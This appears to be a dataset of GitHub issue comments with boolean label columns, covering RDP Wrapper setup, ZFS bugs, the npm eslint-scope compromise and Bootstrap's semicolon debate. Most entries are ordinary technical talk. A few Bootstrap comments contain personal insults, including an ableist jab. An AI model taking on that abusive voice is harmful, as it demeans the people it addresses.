now this was not conflicting with the RDP wrapper Function,  „one“ rfxvmt.dll (32-bit) should be in this folder.  It must exist only ! If you like you can now take my Template  1-17763_rdpwrap.168.194.txt renaming it to  „%program files%\RDP Wrapper\rdpwrap.ini“  ( this folder is the „Default“ for the first Install.) Follow my short instruction  To replace the data in ""%program files%\RDP Wrapper""  I  recommend to use a batch file    with „Pause“ 1  ""stop net termservice"" ,                'PAUSE',   2  delete old ""%program files%\RDP Wrapper\rdpwrap.ini""  3  and copy the „new-ini-168“ to  ""%program files%\RDP Wrapper\rdpwrap.ini""  4 and then    'CONTINUE' ,  ""start net termservice"" ,     'PAUSE'  again. Keep an eye on the Messages  in the ‚PAUSE‘-Phases ! This should help to ensure that the service has stopped  and restarted without errors Also you may     Restart your ""magic-machine"" before you test the RDP Wrapper with RDPconf.exe and (or)  with  RDPcheck.exe to see the settings and function. This concludes the easy test steps. It should work in General. If there are other termservices products installed , it has Always worked fine. b.r. Hajubu Von Kasim Ahmic Gesendet Donnerstag, 13. Dezember 2018 2119 I've followed all the instructions given including those from the 17763-templates.zip file given by @friend but I am still unable to get it working. I have gone as far as uninstalling and reinstalling RDP Wrapper and have even replaced the termsrv.dll file in System32 with an older one (10.0.17763.1) to no avail. Curiously enough, now instead of TermService crashing on launch, it is just in a perpetual state of ""Starting."" Seeing other having success makes me think that this is an isolated issue with my computer alone. Are there any other services, programs, permissions, etc that affect the usage of RDP Wrapper? Besides the standard installation and modification of the INI file, is there anything else I should take a look at? ",False,True
taurus/taurus-org/137/189136621,taurus/taurus-org/137,"Hi, The QPixmapWidget (or any derivate like QLed or TaurusLed) alignment property doesn't work from Qt designer. However, code like this would work pixmap_widget.setAlignment(Qt.Qt.AlignHCenter)  this is because qt designer is doing something like alignment = Qt.Qt.ALignment(Qt.Qt.AlignHCenter) pixmap_widget.setAlignment(Qt.Qt.AlignHCenter) alignment = Qt.Qt.AlignLeft  The alignment is being passed by reference. An internal copy of the received aligment in QPixmapWidget.setAlignment should solve the problem. Reported by tiagocoutinho (  ) ",False,True
lxqt/lxqt/1628/441440237,lxqt/lxqt/1628,"A real-world example? I ask because I don't remember I've encountered this ambiguity anywhere; otherwise, what you said sounds logical. ",False,True
cookiecutter-pypackage/audreyr/280/193527488,cookiecutter-pypackage/audreyr/280,"There's a new version of pytest available. You are currently using 2.9.2. I have updated it to 3.0.5 These links might come in handy  &lt;a href="" | &lt;a href="" | &lt;a href="" merge conflicts? Close this PR and delete the branch. I'll create a new PR for you. Happy merging! 🤖 ",False,True
msgpack-python/msgpack/305/337409477,msgpack-python/msgpack/305,"I understand that  has a single array-type, that both  and  both get mapped to (and that this is the reason for the -kwarg). However, the  distinction is essential in Python, and one can't fully emulate the other (e.g.  is hashable,  isn't;  has an -method,  doesn't). For this reason, I need to reconstruct tuples and lists correctly, e.g.  -- actually, arbitrary nestings of . Currently (v0.5.6), this does not work So now to the actual question - I thought I could use the  keywords to help me out, but this does not work for , even though it does work for sets (and all the other types covered by ). ",False,True
bety/PecanProject/568/367556940,bety/PecanProject/568,"I checked out the website - went through the process of creating new citations, sites, treatments, trait. Everything works as expected - ",False,True
bootstrap/twbs/8662/21668582,bootstrap/twbs/8662,"@friend I don't think that's a valid argument, since this new design is very different from the browser default, but the bootstrap 2 one is close enough to not change the style of it at all if you want something that most people will recognize. ",False,True
ceph/ceph/12105/263700950,ceph/ceph/12105,@friend updated to treat  as a GET request - still passing test_multi.py ,False,True
asynqp/benjamin-hodgson/15/103882436,asynqp/benjamin-hodgson/15,"Yup, builds passing now. ",False,True
GRDB.swift/groue/261/344997610,GRDB.swift/groue/261,"Hints when a contributor asks for details Provide details. This includes  the version of Xcode, and if other version of Xcode are installed on the computer the flavor of GRBD installed (GRDB, GRDBCipher, GRDBCustom?) the version of GRBD installed (v2.3.1, other?) the installation method (CocoaPods, SPM, Carthage, Manual?) a sign that you have read the requirements and searched the doc for an answer to your question a clear and precise statement of your issue  The list is long. But it can fit in two sentences. For example I guess I'll have to write an issue template some day. Fortunately, I currently don't have to close too many issues as invalid because of their low quality. ",False,True
Titan/Marc3842h/145/459958506,Titan/Marc3842h/145,"@friend Until the feature is stablized, a official release won't be published on the releases tab. Some people may be friendly however and send you their own prebuilt versions of the latest Titan source code. @friend Not yet as I'm unable to track progress on that issue as nobody has bothered to open a GitHub issue regarding it. @friend Please read the build guide before asking for any help, as you wouldn't have tried to open the solution file if you would've read it. Existing issues are not a place for asking for help. I will be locking this conversation to prevent more questions. If you find another issue or have more questions, please open a new issue. ",False,True
Ant-Media-Server/ant-media/579/454098109,Ant-Media-Server/ant-media/579,"Hi @friend, Sorry for late response ( We discussed with the team and decided to continue token control in Enterprise Edition. But we can support you about dealing with this issue with Community Edition. You can rename produced files (HLS m3u8 or Mp4) using Ant Media Server Muxers  Init methods ( an example, for HLS Muxer go to Init method and edit this line to change output file names  doing that, users can not guess stream publish id by analyzing stream URL. Please let us know if you have any issue or just send an email. ",False,True
puppeteer-sharp/kblok/736/435887588,puppeteer-sharp/kblok/736,"There is something inside of  or a property missing, that doesn't allow the program to proceed ",False,True
expo/expo/3030/449653286,expo/expo/3030,"There have been a lot of react-native-web related PRs getting merged, but I don't see any mention of react-native-web support on the milestone release plan. Are you planning to unofficially release web support as well with this release? Thanks 😄 Just wondering, because that would be awesome! ",False,True
openDCIM/samilliken/1114/450224347,openDCIM/samilliken/1114,Remove lines 144 150 in your codebase. ,False,True
zfs/zfsonlinux/7401/379877454,zfs/zfsonlinux/7401,"Using @friend's script (well, a slightly corrected version) I can reproduce this on an almost current version of the git tip, g1724eb62d, on Fedora 27 on a simple mirrored vdev in a VM. It doesn't happen on every run, but it happens reasonably frequently (at least half the time, I think). (This git version is the most recent version I've built for my own use. I can test with the very latest git tip, but I don't see anything there that would change this, if the identified cause is right. I'd be happy to test updates in the VM.) ",False,True
react-native-camera/react-native-community/1897/441569467,react-native-camera/react-native-community/1897,@friend Does it also crash on a real device? ,False,True
Laravel-Excel/Maatwebsite/1768/415175016,Laravel-Excel/Maatwebsite/1768,"Thanks for submitting the ticket. Unfortunately the information you provided is incomplete. We need to know which version you use and how to reproduce it. Please include code examples. Before we can pick it up, please check ( and add the missing information. To make processing of this ticket a lot easier, please make sure to check ( and double-check if you have filled in the issue template correctly. This will allow us to pick up your ticket more efficiently. Issues that follow the guidelines correctly will get priority over other issues. ",False,True
asynqp/benjamin-hodgson/15/103807153,asynqp/benjamin-hodgson/15,"I submitted two pull requests today. The first contains the asynqp to the code and tests, the second contains an example program that automatically reconnects. ",False,True
bety/PecanProject/568/367703362,bety/PecanProject/568,@friend let us know when you checked the rest api used in terra project. ,False,True
esx_policejob/ESX-Org/104/333927052,esx_policejob/ESX-Org/104,"Anyone able to help with this I know the state of a vehicle needs to be set to ""0"" in order for it to be impounded and wanted to know if you could help out with adding this into the script I cant seem to get it to work. Thanks ",False,True
freeCodeCamp/freeCodeCamp/10163/286375294,freeCodeCamp/freeCodeCamp/10163,@friend Good suggestions 👍 I'm not really sure what the hints are supposed to be like. I believe the idea is that they should be like the hints on the forum. Should we close this in favour of ,False,True
jekyll/jekyll/6948/383692192,jekyll/jekyll/6948,"Using the quik library for scaffolding. If you scaffold a new jekyll theme or plugin now all the code is ""hard-coded"" / ""hard-wired"". The scaffolding code itself is also ""hard-wired""  / ""hard-coded"", that is, not (re)usable for other projects. Using a (simple) ""generic"" scaffolding library such as quik you can turn any git(hub) repo (or directory/folder or zip archive) into a parametrized and scripted template scaffold. See the Jekyll Quick Starter Template / Scaffold - Build Your Own (Gem-Packaged) Theme as an example. PS Background / References - Talk Notes - Quik - The Missing Project Scaffolder (Library) for Ruby - Quick Start Your Ruby Gems, Jekyll Websites, Jekyll Themes 'n' More ",False,True
ansible/ansible/13262/304353026,ansible/ansible/13262,"@friend @friend @friend (to address the latest ""me too"" commenters) I guess the maintainers got the point, and upvoting/upthumbing of the original request is surely enough, if you don't want to participate in a solution. Thanks,  our inboxes. ",False,True
zfs/zfsonlinux/7401/379866767,zfs/zfsonlinux/7401,Shell script to reproduce (cp not needed) ,False,True
lxqt/lxqt/1628/441442128,lxqt/lxqt/1628,"I've added emphasis to actual real problem . They are not following standards.  in $XDG_CONFIG_DIRS isn't standard. Well, you'll create another issue where will you store this setting? ) Well, if you make following implementation, how do you lose? Quote from my previous message about possible implementation where  mean ",False,True
HandBrake/HandBrake/1584/423829111,HandBrake/HandBrake/1584,"You should have engaged with us earlier with your ideas and discussed them one at a time before implementing everything if you expected our buy-in. If you were afraid we would say ""no"", that's a pretty good indication it needs to be discussed. We could have discussed this in easier bite sized chunks and we could have spent the time to fully discuss why your starting assumptions are incompatible with our plans for the future and perhaps influenced your design to fit to those plans. Just as a guiding principal, a complete instantaneous replacement of the HandBrake GUI is out of the question.  Gradual migration, testing each idea and getting user feedback as we go, has been our mode of development for a very long time.  This is how we plan to continue development. If you have specific ideas with limited impact, feel free to propose them.  But don't expect us to wade through a large collection of ideas in a massive redesign to pick bits that can be migrated in as part of our continual improvement to HandBrake.  To be frank, I just don't have the time for it.  I'm very busy with non-HandBrake real life things.  I've had no time in the last couple weeks and it's looking like I'll have no time in the next couple weeks.  So if you want feedback from me, you've got to keep it down to something I can read and respond to in a few minutes. Also keep in mind that any new design has to be propagated to all 3 GUIs.  Some designs do not fit well with the UI paradigms of the other platforms.  Compromises must be made for the sake of consistency sometimes.  Bradley and Scott have both spent a lot of time prototyping designs and sharing them with the group before implementation so that we can discuss the impacts of the design. This helps in keeping us all in sync with a design that works on all platforms. ",False,True
scratch-blocks/LLK/1840/449960396,scratch-blocks/LLK/1840,"I agree, this is a terrible idea - at best, this should be a per-locale opt-IN. For many locales, especially the smaller ones, machine translation produces nothing but gibberish. What's going to happen is either that some well meaning people will push loads of Google Translate junk live or that some diligent fool will have to manually proofread/reject thousands of Google Translate junk strings. Machine translation is intended as a gisting tool, by and large, and for some language combos (mostly large ones with huge corpora) it may function as a translation aid but for most, it's useless at best, an extra time cost at worst. It will overall reduce the attractiveness of Scratch to educational establishments. There is no quick fix for localization. ",False,True
bootstrap/twbs/3057/5139988,bootstrap/twbs/3057,"@friend Of course, I was just pointing out the obvious. ",False,True
angular.js/angular/1463/31418932,angular.js/angular/1463,plus one Im using mongodb. Im going to change my server code. Not ideal. ,False,True
bootstrap/twbs/3057/5168612,bootstrap/twbs/3057,"This'll probably get lost in the noise, but the problem isn't confined to Jsmin. My webminifer plugin (which can use Closure or YUI for minification), also suffered the problem. The resolution was to ensure that a semicolon always appears between each file that is appended to each other (I append all files of my project and then minify). My recommendation to the Bootstrap boys is to think about linting the code and avoid ambiguities. I love bootstrap, but the JS is not so intuitive. ",False,True
FastAdapter/mikepenz/695/401857355,FastAdapter/mikepenz/695,`´ ,False,True
openDCIM/samilliken/1114/450220825,openDCIM/samilliken/1114,"It's now obvious that Pig does not understand LDAP rfc2307 either. Group membership is a separate object from the user object in rfc2307, and membership is denoted using uid or the uid object (rfc2307 vs rfc2307bis). so using 'cn' to search for group membership in a rfc2307 schema fails. And no, I was not going to post the complete object in a public forum. ",False,True
bootstrap/twbs/3057/5168901,bootstrap/twbs/3057,"@friend Berating someone much smarter than you might make you feel better but you're not impressing anyone nor are you changing the reality that you are a clueless, talentless hipster. ",False,True
manageiq/ManageIQ/1210/67417747,manageiq/ManageIQ/1210,"@friend yay, I guess. ",False,True
bootstrap/twbs/3057/5156512,bootstrap/twbs/3057,"The level of Asperger-fueled pedantry on display here makes me feel sick. Just shut up please, JavaScrHiptsters. ",False,True
expo/expo/3030/451563093,expo/expo/3030,"@friend works fine now with a reset. Any way to do it from the CLI? Used  in the past, but that seems lost now. ",False,True
npm/npm/21202/404563902,npm/npm/21202,"@friend That won't work. Eval is needed for a lot of things, and banning it won't do. We need package signing - which NPM actively rejected, but I feel like this has a use right now judging from the current events right now ",False,True
rack/rack/1016/186805175,rack/rack/1016,"Your  is specifying  as a response header rather than a request header. You want to specify the header as an argument to , similar to ",False,True
react-helmet/nfl/373/448069883,react-helmet/nfl/373,"Ok, I can to pay something. What the cost you’re talking about? We just need a working package, and we know what the “open source” means. ",False,True
Polaris/PolarisSS13/4539/359086625,Polaris/PolarisSS13/4539,Oh right! That! ,False,True
GoMint/GoMint/406/434027281,GoMint/GoMint/406,"I don't get the error so i cant, can i? ",False,True
framework/laravel/25212/413214021,framework/laravel/25212,This is a known limitation #24734 ,False,True
flood/jfurrow/240/373477976,flood/jfurrow/240,I think this is the better approach. Because making some default credentials and a lot of users will never change them. Make them forced to change the password bu the default account name will be the same everywhere and bad guy will have no pain to bruteforce weak password. It's maybe more work do make authentication optional but it seems more secure than providing default credentials. And this will be cleaner. ,False,True
coc.nvim/neoclide/305/450469131,coc.nvim/neoclide/305,Not a realistic solution for C++ (or most languages supporting overloads). ,False,True
RestSharp/restsharp/865/233555238,RestSharp/restsharp/865,"Hi,  actually you are getting whole object as new, not only customer. But because code is int, default is 0. So, I recommend to not use 0 as OK result. Or even better, exclude code from json and use common http status codes? To your problem, cannot say exactly, quick checked on mine and it's deserialized correctly. Maybe there is some issue in headers, but I've also made some changes and wasn't able to break it. So, I can only recommend to download RS source and track deserialization to the issue. ",False,True
homebrew-bundle/Homebrew/308/347027607,homebrew-bundle/Homebrew/308,@friend Ok. Would you consider submitting a PR to address that case? ,False,True
lxqt/lxqt/1628/441150980,lxqt/lxqt/1628,"Do we know how KDE handles it? I don't know much about these things but I think, sometimes, it's good to know how KDE deals with problems we encounter (although this may not be our problem). ",False,True
eXpand/eXpandFramework/176/425666551,eXpand/eXpandFramework/176,see #185  for your first point ,False,True
Titan/Marc3842h/145/459053960,Titan/Marc3842h/145,"yea the Steam API key is located in  and it only contains the key, no special formatting. ",False,True
angular.js/angular/1463/10713204,angular.js/angular/1463,"Angular is stripping the $ because it is used for Angular (mostly) properties/methods and when they are converted to JSON,  they're stripped because it's extraneous. Here's an idea for a solution For certain components, e.g. $resource or $http, allow a special leading sequence (such as ""+$"") to signal that the $ not be stripped. I don't believe this would be a breaking change. So, for this example, '+$oid' would be stripped down to '$oid'. Thoughts? ",False,True
julia/JuliaLang/29438/365216551,julia/JuliaLang/29438,"Hey, I know you don't like questions here or issues of that kind BUT I'm not really getting much help on discourse as you can see here Basically  I’ve uploaded my package to Github and didjulia authors = [""TheOnlyArtz &lt;MAIL&gt;"", ""PurgePJ &lt;MAIL&gt;""] name = ""Julicord"" uuid = ""91c305b0-c482-11e8-244f-23e78ed5e04c"" version = ""0.1.0"" [deps] Dates = ""ade2ca70-3891-5945-98fb-dc099432e06a"" JSON = ""682c06a0-de6a-54ab-a142-c8b1cf79cde6"" WebSockets = ""104b5d7c-a370-577a-8038-80a2059c5097"" HTTP = ""cd3eb016-35fb-5094-929b-558a96fad6f3"" ♠ ",False,True
SwipeCellKit/SwipeCellKit/199/390413370,SwipeCellKit/SwipeCellKit/199,thank you! that worked ,False,True
npm/npm/21202/404562285,npm/npm/21202,"@friend and others suggesting npm integration into git. Not every npm package uses git, and certainly not everyone uses github. Marrying the two concepts doesn't make sense to me. I think the best solution is faster communication and awareness of exploited packages. Some brainstorming ideas  Maybe integrate the npm ecosystem into something like node security project. Warnings should be shown inside of NPM cli when a vulnerable package is found in the dep tree. Easy flagging of infected code to notify maintainers. Have stricter publish regimens for foundational (heavily depended on) dependencies. Maybe enforce manual audits with two factor authentication. Realistically dependencies that have thousands and thousands of dependents should not be modified so frequently, or they must go through a manual audit step.  Perhaps have a badge awarded to releases that have been manually audited and approved with a 2 factor verification. ... I could go on  ",False,True
rdpwrap/stascorp/645/455783351,rdpwrap/stascorp/645,"  Could be a  version only for pro. I picked it up doing a repair install using the media creation tool having previously had .168, windows update wasn't offering the update at the time. ",False,True
npm/npm/21202/404550816,npm/npm/21202,"@friend Agree with all of your points, but I'd go a step further with number 2 in addition to searching the registry, unpublish all packages published since the affected version was published (and even then, it's not clear yet if the eslint-scope infection was a result of a further upstream infection). The virus could have modified itself (or have been manually modified, or use a different version entirely) so as to be unrecognizable from the original. There's nothing to say that the pastebin code from this incident is the same as what would be infected in other packages of authors with their credentials compromised. The credentials are being logged to web counters, which to use the credentials they would have to be monitored from an outside source, so there's nothing stopping that outside source from publishing a different script entirely. ",False,True
ansible/ansible/13262/309240095,ansible/ansible/13262,"@friend because we're all getting the ""me too"" notifications even though nothing of interest was posted. Please just add a ""thumbs up"" reaction to the relevant post(s), see @friend's comment. ",False,True
SickChill/SickChill/5159/435699073,SickChill/SickChill/5159,"My thoughts would be to recommend the security approach during the setup of sickchill for new users based on how it will be accessed (ie, lan only, direct internet access, internet access via proxy). Forcing security could break a few existing setups if people are using reverse proxy's for example. Also, you would need to take into account, third party applications, it could take them many days/weeks(if ever) to work with secure connections to sickchill. My 2p ) ",False,True
rdpwrap/stascorp/645/457162436,rdpwrap/stascorp/645,"Appears ""full supported"" but when the second user try to access the remote desktop the server try to logout the first user. How to fix it? ",False,True
LightMarker2/NeilLi1992/3/354612823,LightMarker2/NeilLi1992/3,Resolved by commit 613ba9a641ab69ef14140d45597cb4fa9803ee18 ,False,True
termux-packages/termux/2735/412865898,termux-packages/termux/2735,"""startarch"" missing sdrausty/TermuxArch#104 Issues on aarch64 sdrausty/TermuxArch#105 Permission Denied when creating symlink to ca-certificate sdrausty/termux-archlinux#11 ""TermuxArch warning Script signal 1 generated! "" sdrausty/termux-archlinux#12  @friend Can you post exact steps to reproduce a problem with ""busybox tar"" instead of posting links to various issues whose problem may have a different source ? Or we should debug TermuxArch to find where problem occurs ? For me, at least, there no problem with command  that you posted  So there some possibility that TermuxArch script is faulty or your user did something wrong. Busybox has a relation to ecj or java ? That's something new for me... ",False,True
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/400703392,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183,"Well, I like having the comment box side by side to the code I comment. Having to scroll back and forth between both when commenting is distracting and leads to errors in the comments. But as you do, I'd really welcome a wider code pane. ",False,True
AKS/Azure/132/365684386,AKS/Azure/132,This is pretty bad design decision to not support it. You cannot really predict future workload. Two days ago I created small cluster with a lot of memory but small number of CPU (many pods which are active from time to time) but today it turned out we need much more CPUs. I scaled it up by adding new nodes but this is not what we want. ,False,True
vuejs.org/vuejs/974/313768554,vuejs.org/vuejs/974,"@friend To add a new page to the guide, create a new  file in . Each page has some metadata at the top, then it's just markdown below. 🙂 ",False,True
jekyll/jekyll/6948/397028665,jekyll/jekyll/6948,"User comments please, filterable and maybe with optional moderation. ",False,True
A3-Antistasi/A3Antistasi/57/394175475,A3-Antistasi/A3Antistasi/57,"@friend I repeat you are more than welcome to help posting issues and PR on this repository, in english ;) Issue will be treated later on. ",False,True
node-re2/uhop/49/498528783,node-re2/uhop/49,"With NaN changing almost every release I am seriously entertaining an option of using N-API instead. NaN should be updated to the latest version, but it is likely to have some API changes as well. I'll look into that later this week. If the update is too big, I'll try to switch to N-API. ",False,True
puppeteer-sharp/kblok/736/435950570,puppeteer-sharp/kblok/736,"I will try, but how can you explain me is it working on windows forms, and all other methods work fine as a line? ",False,True
AKS/Azure/287/445806268,AKS/Azure/287,Is there a criteria to close an issue @friend? Why it would be closed if the issue was not solved? ,False,True
react/facebook/7245/164807906,react/facebook/7245,I inlined some requires in #7188 to fix the build size regression. However this caused an issue with Jest due to it resetting module registry between tests. This is a temporary fix to #7240. It should be reverted as part of #7178. Test plan  Verify #7240 is fixed by following its repro instructions. You would need to build React and copy  into its .  Verify a React example (e.g. ) in the repo runs with minified and unminified React.  Check that the minified build size has not increased.   Reviewers @friend @friend (Yes I know it’s super ugly. The upside is I know Jest a little better now!) ,False,True
SickChill/SickChill/5159/436530560,SickChill/SickChill/5159,"So far the feedback has been twofold  LGTM or (and this is mostly from power users) why have this mandatory?  Great feedback, I think that if we change 'mandatory' to 'enabled by default in new installs' there is no objection left? ",False,True
core/owncloud/27775/301470026,core/owncloud/27775,"The workaround @friend used worked like a charm for me. Just a question, for the sake of knowledge It's technically possible to resolve the issue via repository uploading a temporary package? ",False,True
Elgg/Elgg/6779/41473660,Elgg/Elgg/6779,"Agreed we should avoid weighing down Elgg with more (overly specific) JS libs. I think one question here is whether we even want to support opera mobile? The other question is why is our current solution failing? Finally Do we want to try to fix our toggle button hack, or should we perhaps just wait until we have a more proper JS framework in core and revisit this then? ",False,True
NanoCore/NanoAdblocker/87/356603912,NanoCore/NanoAdblocker/87,hmm.. you can segregate this rules to category and hide ,False,True
ansible/ansible/13262/202997642,ansible/ansible/13262,"@friend I don't believe so, but as a workaround you can loop over includes as suggested by @friend ",False,True
FastAdapter/mikepenz/695/401855597,FastAdapter/mikepenz/695,"And you won't be able to use FastItemAdapter for that, better use the FastAdapter and add the model adapters to it. ",False,True
react-helmet/nfl/373/404317158,react-helmet/nfl/373,What is the reasoning behind the deep equality check? Per the React docs... ,False,True
Elgg/Elgg/1547/13655414,Elgg/Elgg/1547,brettp wrote on 40150313-09-02  Check the attitude at the login page. Submit concise and useful tickets to help better the project.  ,False,True
puppeteer-sharp/kblok/736/448981609,puppeteer-sharp/kblok/736,@friend some reading here  we shouldn't use Task.Run on ASP.NET. But I can't say that this is THE solution. ,False,True
ansible/ansible/13262/288077637,ansible/ansible/13262,"@friend It would also make working with  and  much easier, since we would have something like a variable scope during the play. I ran into this issue multiple times (loop over xyz, register it and use it in the next step) and doing an variable extraction after the combination of attributes mentioned above is quite painful. ",False,True
jekyll/jekyll/6948/387056265,jekyll/jekyll/6948,@friend  something like this ,False,True
eXpand/eXpandFramework/176/425669646,eXpand/eXpandFramework/176,True. What is missing is UpdateOnly mode and fail the while record if the reference record does not exist. In fact I would have that for master record as well! ,False,True
bootstrap/twbs/3057/5239174,bootstrap/twbs/3057,Be careful with Semicolon-free! ,False,True
piwik/piwik/3405/48309555,piwik/piwik/3405,In 5db45de92582cfd5cef4a0c9ff6622b9f41d37b3 Fixes #3405 Clearning up the code and fixing the logic so archive.php will process websites properly when executed concurrently! ,False,True
SickChill/SickChill/5159/437425814,SickChill/SickChill/5159,"I understand your view, but am very much of the kiss principle. If uneducated(from a security perspective)/unaware users run sickchill open on the net, they are leaving themselves exposed and your approach is a perfect, but for people in the know, or who do not want to further complicate their configuration, should have the option to run in non tls/non secure mode. I suggest that during a fresh install, a wizard is launched asking for how sickchill, will be accessed remotely and based on the response, you set default security settings accordingly. For existing installs, advise people of the new options(be it in the config file itself, or in the gui). That will alleviate the issue. Also one other point to consider, it is not just a human who accesses sickchill, other open source apps may do so as well(ie sabnzbd, nzb get, nzbtosickrage etc etc). It may take these a while to update their configs, to support secure connections. my 2p ) ",False,True
bootstrap/twbs/3057/5139156,bootstrap/twbs/3057,"@friend TL;DR two tools are incompatible to each other with each author claiming what they do is the one true way. However one tool (JSmin) is deployed across the entire JS ecosystem at countless locations site authors have no influence whatsoever, and the other is ignoring sage advice from one of our elders, you decide! P.S. we now also have a gazillion forks of JSmin and bootstrap, both of which are virtually useless for different reasons. If you fork JSmin you'd have to convince everybody in the foodchain to use the forked JSmin or you're still gettting screwed at places you have no choice about, and the bootstrap forks would have to keep up with the primary upstream (bootstrap) or they're quickly getting to a derelict unmaintained state. ",False,True
lxqt/lxqt/1628/441439219,lxqt/lxqt/1628,"BTW, this issue is still open. ",False,True
ansible/ansible/14050/238227079,ansible/ansible/14050,"@friend  soo, you basically want  ? the command module already has this. ",False,True
GoMint/GoMint/406/434024381,GoMint/GoMint/406,"@friend Maybe he means ""Running behind"" ",False,True
Sabaki/SabakiHQ/341/368601849,Sabaki/SabakiHQ/341,"It is meant as constructive criticism. It's a very good book, which is why it's still in print, and the principles are time-tested. Also, I didn't quote the book, but referenced it from my memory of it. My Computer Science degree was specialized in Human-Computer Interaction, and Don Norman is well-known in that field. That's how I know about the book, and why I read it. Also, I did give a concrete suggestion, but since I added it later as an edit, perhaps you missed it ... Which button are you referring to? I'm referring to the score display control that shows up when you do Estimate, and it shows, for example, something like ""W+50.5"", and when you hover over it, it says ""Details"". Clicking on that control/button brings you to the Score calculation dialog where you can finally select Area or Territory. It's this dual-purpose control that both displays the score and is also a Details button that I'm referring to. It doesn't sound the same as the Done button you're referring to. Just for reference, other Go UIs such as the WGo UI display both territory and area scoring when you select Count Score from its hamburger menu. The real issue here is that I was opening SGF files which had their RU tag set to 'Chinese', but Sabaki was showing scoring based on territory/Japanese, rather than area/Chinese. If the scoring defaulted to area for 'Chinese', and territory for 'Japanese', that would be better, IMO. Unless they are opening multiple SGF files, in which case, the users would expect that the 'score' should be based on the ruleset specified by the existing SGF. Games from different sources, or even the same source (such as OGS), can use different rulesets from one game to the next. If the user has to open up the SGF file in a text editor to discover what the ruleset is, and then locate the difficult-to-find Details/Score calculation dialog just to toggle to the right scoring method, that's a pretty big pain in the UI. Sabaki can easily figure out which scoring should be default and toggle to that. Or, alternatively, just show both scoring methods, each on its own line, when the user clicks Estimate. Presumably, it also specifies how the score in the game result property was calculated. ",False,True
A3-Antistasi/A3Antistasi/57/323119824,A3-Antistasi/A3Antistasi/57,"Version 1.0.0+ Mods CBA, TFAR, ACE(no-medical) Environment MP dedi .rpt attatched? NO have you edited the missionfile? NO Is it possible to add a parameter such as ""load save"" to the parameters (lobby) of the mission? It will automatically load the previous saving of the campaign, by default (for your servers) you can set it to whatever value you want, for example, it's off, me and other server owners are very comfortable will be when I can turn it on (for example, through the cfg file) ",False,True
react-helmet/nfl/373/407987711,react-helmet/nfl/373,"Aha, you mean that you have to update that key on every render.  Yep, that seems faster than deepEqual, but still not quite clean as fix deepEqual or avoid children. ",False,True
zfs/zfsonlinux/7401/379898356,zfs/zfsonlinux/7401,Our analysis so far has not determined how the additional files whose  completes after a prior zap expansion failure on the directory end up orphaned. ,False,True
flood/jfurrow/240/412890829,flood/jfurrow/240,"@friend Personally, I think all services should have authentication, even if it is only LAN? DNS rebinding could well come into this ",False,True
asynqp/benjamin-hodgson/15/100887823,asynqp/benjamin-hodgson/15,"I think there are a few related issues here  When a TCP connection unexpectedly drops, there's no exception to notify application code of the error. When the TCP connection has dropped, you can't manually  a connection. When the TCP connection has dropped, you can't manually  a channel. When the TCP connection has dropped, you can't unsubscribe existing consumers.  Regarding point 1. Error handling in async code is generally quite complicated (where should the exception go if all your application code is currently idle?).  approaches the issue by allowing you to register an exception handler with the event loop - so in theory all  needs to do is raise an appropriate exception when the connection is lost, and then you can use the loop's exception handler to build any application-specific retry logic. I happen to know that the transport calls  when the socket dies. It looks like our  doesn't override that method. I think all it needs to do is  - I'll accept a pull request (with tests) which addresses that (I may get some time to work on it tomorrow but I can't make any promises). Points 2-4 seem related to me (though I split them up because they may require separate fixes). Thinking out loud - I guess that those three methods try to send a frame over the wire to the server, which blocks forever because the socket is dead. I suppose one option would be to throw an exception when you try to send data through the protocol if the connection has been lost, and do some sort of ""emergency shut-down"" of any live objects or tasks which assume the connection is still open. In general, 's error handling capabilities have room for improvement. Thanks very much for raising the issue smiley Sorry for the guesswork-filled reply, my brain has not been in AMQP mode for a while so the neural pathways have crusted up a bit wink ",False,True
scylla/scylladb/2549/240898532,scylla/scylladb/2549,"Installation details Scylla version (or git commit hash) master The cause is migration to v3 schema tables, which results in different table schema digests on 2.0 nodes. Reads (with CL &gt; ONE) ",False,True
forum/standardnotes/39/451736526,forum/standardnotes/39,Came across SN. Love it. Zero keyboard shortcuts.  Uninstall. A pity! ,False,True
opencv/opencv/12198/412343725,opencv/opencv/12198,"At first, it is better to contact with your own layer. From technical side, OpenVINO dependency is optional and disabled in default builds (so there are no such questions by default). You need proper OpenVINO installation  during OpenCV build step during running of OpenCV-based apps So you need to agree with OpenVINO license in both cases.  ",False,True
Polaris/PolarisSS13/4539/288474267,Polaris/PolarisSS13/4539,"Tesla Engine Ported from Paradise and TG; many authors involved  Items added  Adds the Tesla energy ball.  Its created by bombarding the Tesla generator with the Particle Accelerator.  Its a big ball that shoots lightning bolts at stuff.   Don't let it hit you.   Luckily the singularity containment field works on the energy ball too. Adds the Tesla coil and grounding rod machines.  They are how you actually gather power from the energy ball and protect the station from lightning bolts. They are both constructable in game, get circuits from RnD and autolathe respectively.   Adds the Tesla generator. This is required to actually make the Tesla energy ball.  This is not mapped in and the generator can't be built or ordered from cargo.  Therefore players can't actually get the Tesla engine running in game unless an admin spawns it or it is added to the map. In game manual forthcoming in case its decided to let players build it.  Supporting technologies  Ports typecache list procs from TG.  These are a fast way to filter a list of atoms by type. Ports the ""orbit"" feature and subsystem from TG ( tgstation/tgstation#10960 tgstation/tgstation#20632 ) Adds utility methods for common machinery behavior.  I have wanted this for awhile. It could get even more sophisticated if we wanted, but  takes care of the most common repeated code in machinery   ",False,True
vuejs.org/vuejs/974/369069518,vuejs.org/vuejs/974,"Is there evidence to support this? Specifically, that including  or non standard attributes hurt search ranking? I can't imagine search doing this because the practice is already pretty widespread and doesn't have obvious negative user impact. ",False,True
Kosmos/AtlasNX/187/465081420,Kosmos/AtlasNX/187,The whole point of separating them is exactly to not provide a option in the CFW and have the user opt-in by adding the files manually. Having them default available via a bundled tool would make it ban-able. Being a extra download on the same Site is as far I want to go. Edit I don't care tho if the user already has them installed ,False,True
FastAdapter/mikepenz/695/401859286,FastAdapter/mikepenz/695,"you have to store the reference of the ModelAdapter somewhere ofc to add item to it. No modification of the items is required for that.  An sample for the interceptor is  for example, but in your case the interceptor will return the value without nay changes. The item list impl is the class i posted before ",False,True
bootstrap/twbs/9501/32693949,bootstrap/twbs/9501,That is an answer we can live with. TY ,False,True
bootstrap/twbs/3057/5160265,bootstrap/twbs/3057,but is it flogDeadHorse()  or flogDeadHorse();  ?!? ,False,True
expo/expo/3030/449563529,expo/expo/3030,Will this support react hooks? ,False,True
